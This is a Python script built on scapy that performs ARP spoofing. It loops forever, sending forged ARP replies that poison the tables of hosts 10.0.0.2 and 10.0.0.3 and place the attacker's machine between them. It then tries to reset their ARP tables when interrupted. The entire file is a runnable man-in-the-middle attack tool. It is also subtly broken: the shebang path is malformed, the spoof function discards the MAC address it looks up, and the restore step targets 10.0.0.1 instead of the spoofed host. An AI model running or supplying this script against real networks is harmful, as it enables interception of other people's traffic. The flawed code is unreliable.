#!/usr/env/bin python3

import scapy.all as scapy
import time

def getMAC(ip):
	arpRequest = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arpRequestBroadcast = broadcast/arpRequest
	answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

	return answeredList[0][1].hwsrc

def spoof(targetIP, spoofIP):
	targetMAC = getMAC(targetIP)
	packet = scapy.ARP(op = 2, pdst = targetIP, hwdst = "", psrc = spoofIP)
	scapy.send(packet, verbose = False)

def restore(destinationIP, sourceIP):
	destinationMAC, sourceMAC = getMAC(destinationIP), getMAC(sourceIP)
	packet = scapy.ARP(op = 2, pdst = destinationIP, hwdst = destinationMAC, psrc = sourceIP, hwsrc = sourceMAC)
	scapy.send(packet, count = 4, verbose = False)

try:
	sentPacketsCount = 0
	while True:
		spoof("10.0.0.2", "10.0.0.3")
		spoof("10.0.0.3", "10.0.0.2")
		sentPacketsCount += 2
		print("\r[+] Packets sent: " + str(sentPacketsCount), end = "")
		time.sleep(2)
except KeyboardInterrupt:
	print("[+] Detected CTRL + C . . . . Resetting ARP tables. ")
	restore("10.0.0.3", "10.0.0.1")
	restore("10.0.0.1", "10.0.0.3")